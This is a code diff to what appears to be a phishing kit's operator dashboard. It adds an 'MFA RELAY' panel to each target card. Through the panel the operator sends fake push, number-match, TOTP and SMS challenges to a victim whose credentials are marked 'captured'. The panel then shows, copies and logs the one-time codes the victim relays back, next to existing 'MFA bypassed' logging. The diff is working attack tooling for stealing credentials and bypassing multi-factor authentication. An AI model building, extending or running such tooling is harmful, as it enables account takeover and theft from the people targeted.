@@ -86,6 +86,28 @@
     .tc-notes-saved { font-size: 10px; color: var(--green); margin-top: 4px; display: none; }
     .tc-timer { font-size: 10px; color: var(--text-dim); margin-top: 4px; }
 
+    /* MFA Relay Controls */
+    .tc-mfa-relay { margin: 12px 0; padding: 12px; background: rgba(188,140,255,0.06); border: 1px solid rgba(188,140,255,0.2); border-radius: 4px; }
+    .tc-mfa-header { font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--purple); margin-bottom: 8px; }
+    .tc-mfa-buttons { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
+    .mfa-type-btn { padding: 5px 12px; font-size: 11px; font-weight: 600; font-family: inherit; border-radius: 3px; cursor: pointer; transition: all 0.15s; border: 1px solid; }
+    .mfa-btn-push { background: rgba(88,166,255,0.08); color: var(--accent); border-color: var(--accent); }
+    .mfa-btn-push:hover { background: rgba(88,166,255,0.18); }
+    .mfa-btn-number { background: rgba(210,153,34,0.08); color: var(--orange); border-color: var(--orange); }
+    .mfa-btn-number:hover { background: rgba(210,153,34,0.18); }
+    .mfa-btn-totp { background: rgba(63,185,80,0.08); color: var(--green); border-color: var(--green); }
+    .mfa-btn-totp:hover { background: rgba(63,185,80,0.18); }
+    .mfa-btn-sms { background: rgba(188,140,255,0.08); color: var(--purple); border-color: var(--purple); }
+    .mfa-btn-sms:hover { background: rgba(188,140,255,0.18); }
+    .tc-mfa-input { display: flex; gap: 6px; align-items: center; margin-top: 8px; }
+    .mfa-relay-input { flex: 1; padding: 6px 10px; font-size: 13px; font-family: inherit; background: var(--bg); border: 1px solid var(--border); border-radius: 3px; color: var(--text); outline: none; }
+    .mfa-relay-input:focus { border-color: var(--accent); }
+    .mfa-send-btn { padding: 6px 14px; font-size: 11px; font-weight: 600; font-family: inherit; background: rgba(188,140,255,0.1); color: var(--purple); border: 1px solid var(--purple); border-radius: 3px; cursor: pointer; white-space: nowrap; }
+    .mfa-send-btn:hover { background: rgba(188,140,255,0.2); }
+    .tc-mfa-code-received { display: flex; align-items: center; gap: 8px; margin-top: 10px; padding: 8px 10px; background: rgba(63,185,80,0.08); border: 1px solid rgba(63,185,80,0.3); border-radius: 3px; animation: slideIn 0.3s ease; }
+    .mfa-code-label { font-size: 10px; font-weight: 600; color: var(--green); text-transform: uppercase; letter-spacing: 0.5px; }
+    .mfa-code-value { font-size: 18px; font-weight: 700; font-family: "Consolas", monospace; color: var(--green); letter-spacing: 3px; }
+
     /* Sidebar */
     .sidebar { display: flex; flex-direction: column; gap: 12px; }
     .side-card { background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 14px; }
@@ -244,6 +266,30 @@
         actionsHtml += '<span style="font-size:11px;color:var(--green);">&#x2705; Released at ' + esc(t.released_at || '') + '</span>';
       }
 
+      // MFA relay controls (only show when target is in mfa_pending or compromised)
+      var mfaHtml = '';
+      if (t.status === 'mfa_pending' || t.status === 'captured') {
+        mfaHtml =
+          '<div class="tc-mfa-relay">' +
+            '<div class="tc-mfa-header">MFA RELAY</div>' +
+            '<div class="tc-mfa-buttons">' +
+              '<button class="mfa-type-btn mfa-btn-push" onclick="sendMfa(\'' + sid + '\', \'push\')">Push Approval</button>' +
+              '<button class="mfa-type-btn mfa-btn-number" onclick="promptNumberMatch(\'' + sid + '\')">Number Match</button>' +
+              '<button class="mfa-type-btn mfa-btn-totp" onclick="sendMfa(\'' + sid + '\', \'totp\')">TOTP Code</button>' +
+              '<button class="mfa-type-btn mfa-btn-sms" onclick="promptSms(\'' + sid + '\')">SMS Code</button>' +
+            '</div>' +
+            '<div class="tc-mfa-input" id="mfa-input-' + sid + '" style="display:none">' +
+              '<input type="text" id="mfa-val-' + sid + '" class="mfa-relay-input" placeholder="">' +
+              '<button class="mfa-send-btn" onclick="sendMfaFromInput(\'' + sid + '\')">Send to Target</button>' +
+            '</div>' +
+            '<div class="tc-mfa-code-received" id="mfa-code-' + sid + '" style="display:none">' +
+              '<span class="mfa-code-label">CODE RECEIVED:</span>' +
+              '<span class="mfa-code-value" id="mfa-code-val-' + sid + '"></span>' +
+              '<button class="copy-btn" onclick="copyToClip(this, document.getElementById(\'mfa-code-val-' + sid + '\').textContent)">Copy Code</button>' +
+            '</div>' +
+          '</div>';
+      }
+
       var cardHtml =
         '<div class="tc-header">' +
           '<div>' +
@@ -255,6 +301,7 @@
         '<div class="tc-body">' +
           '<div class="tc-creds">' + credsHtml + '</div>' +
           '<div class="tc-actions">' + actionsHtml + '</div>' +
+          mfaHtml +
           '<div class="tc-notes">' +
             '<textarea placeholder="Add notes (MFA bypassed, target behavior, etc.)" onchange="saveNote(\'' + sid + '\', this.value)" id="notes-' + sid + '">' + esc(t.notes || '') + '</textarea>' +
             '<div class="tc-notes-saved" id="saved-' + sid + '">Saved</div>' +
@@ -377,6 +424,69 @@
       socket.emit('mark_compromised', { sid: sid });
       addLog('MFA bypassed: ' + (targetData[sid] ? targetData[sid].email : sid));
     }
+
+    // ── MFA Relay ───────────────────────────────
+    var pendingMfaType = {};  // sid -> type being configured
+
+    function sendMfa(sid, type) {
+      socket.emit('send_mfa_challenge', { sid: sid, type: type });
+      addLog('Sent MFA (' + type + '): ' + (targetData[sid] ? targetData[sid].email : sid));
+      // Hide input area since these don't need extra data
+      var inputEl = document.getElementById('mfa-input-' + sid);
+      if (inputEl) inputEl.style.display = 'none';
+    }
+
+    function promptNumberMatch(sid) {
+      pendingMfaType[sid] = 'number_match';
+      var inputEl = document.getElementById('mfa-input-' + sid);
+      var valEl = document.getElementById('mfa-val-' + sid);
+      if (inputEl && valEl) {
+        valEl.placeholder = 'Enter number (e.g. 86)';
+        valEl.value = '';
+        valEl.maxLength = 2;
+        inputEl.style.display = 'flex';
+        valEl.focus();
+      }
+    }
+
+    function promptSms(sid) {
+      pendingMfaType[sid] = 'sms';
+      var inputEl = document.getElementById('mfa-input-' + sid);
+      var valEl = document.getElementById('mfa-val-' + sid);
+      if (inputEl && valEl) {
+        valEl.placeholder = 'Phone hint (e.g. ***4589) or leave blank';
+        valEl.value = '';
+        valEl.maxLength = 20;
+        inputEl.style.display = 'flex';
+        valEl.focus();
+      }
+    }
+
+    function sendMfaFromInput(sid) {
+      var type = pendingMfaType[sid];
+      var val = document.getElementById('mfa-val-' + sid).value.trim();
+      if (type === 'number_match') {
+        socket.emit('send_mfa_challenge', { sid: sid, type: 'number_match', number: val });
+        addLog('Sent number match (' + val + '): ' + (targetData[sid] ? targetData[sid].email : sid));
+      } else if (type === 'sms') {
+        socket.emit('send_mfa_challenge', { sid: sid, type: 'sms', phone_hint: val || 'your phone' });
+        addLog('Sent SMS challenge: ' + (targetData[sid] ? targetData[sid].email : sid));
+      }
+      var inputEl = document.getElementById('mfa-input-' + sid);
+      if (inputEl) inputEl.style.display = 'none';
+    }
+
+    // Handle relayed codes from targets
+    socket.on('mfa_code_received', function(data) {
+      var sid = data.sid;
+      var codeEl = document.getElementById('mfa-code-' + sid);
+      var codeValEl = document.getElementById('mfa-code-val-' + sid);
+      if (codeEl && codeValEl) {
+        codeValEl.textContent = data.code;
+        codeEl.style.display = 'flex';
+      }
+      addLog('CODE RECEIVED (' + data.type + '): ' + data.code + ' from ' + data.email);
+    });
 
     function saveNote(sid, note) {
       targetData[sid].notes = note;
